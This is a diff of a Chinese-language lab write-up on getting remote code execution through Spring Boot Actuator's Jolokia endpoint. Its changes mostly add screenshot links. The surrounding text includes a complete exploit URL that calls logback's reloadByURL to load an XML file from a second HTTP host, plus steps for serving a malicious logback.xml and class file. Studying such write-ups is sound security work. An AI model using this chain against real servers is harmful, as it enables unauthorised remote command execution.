@@ -70,8 +70,13 @@ tcp6       0      0 :::8090                 :::*                    LISTEN      
 root@kali:~/actuator/actuator-testbed#
 ```
 http://10.20.24.191:8090/
+![](./spring.png)
 
-`http://10.20.24.191:8090/jolokia/list`  中 reloadByURL 可以加载远程 url xml 文件
+http://10.20.24.191:8090/jolokia/list 
+![](./reloadByURL.png)
+
+中 reloadByURL 可以加载远程 url xml 文件
+
 
 ```
 "ch.qos.logback.classic": {
@@ -91,7 +96,11 @@ http://10.20.24.191:8090/
 ```
 
 ## 0x03 http 服务存放logback.xml,ExportObject.class
+
+
 logback.xml 文件内容
+
+![](./logback.png)
 
 ```
 <configuration>
@@ -155,7 +164,11 @@ Closing connection
 
 `http://10.20.24.191:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/10.20.24.191:8000!/logback.xml`
 
+![](./RCE_GET.png)
+
 ## 0x05 命令执行成功
+
+![](./a_success.png)
 
 ```
 root@kali:/var/www/html# ls /tmp/j*
